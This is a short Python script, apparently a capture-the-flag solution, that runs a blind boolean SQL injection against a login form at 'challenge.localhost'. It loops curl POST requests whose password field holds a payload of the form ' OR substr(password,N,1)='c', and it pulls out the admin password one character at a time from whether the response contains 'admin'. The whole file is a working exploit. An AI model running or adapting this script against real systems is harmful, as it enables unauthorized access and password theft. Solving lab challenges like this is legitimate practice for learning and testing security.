import subprocess


def brute_force():
    result = []
    valid_chars_set = (
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}.-_"
    )

    pos = 1
    while True:
        failed = 0
        for c in valid_chars_set:
            cmd = [
                "curl",
                "-L",
                "-c",
                "cookies.txt",
                "-b",
                "cookies.txt",
                "-d",
                f"username=admin&password=' OR substr(password,{pos},1)='{c}",
                "http://challenge.localhost:80/",
            ]
            resp = subprocess.run(cmd, capture_output=True, text=True)
            if "admin" in resp.stdout:
                result.append(c)
                break
            else:
                failed += 1

        if failed == len(valid_chars_set):
            break

        pos += 1

    return "".join(result)


if __name__ == "__main__":
    result = brute_force()
    print(result)
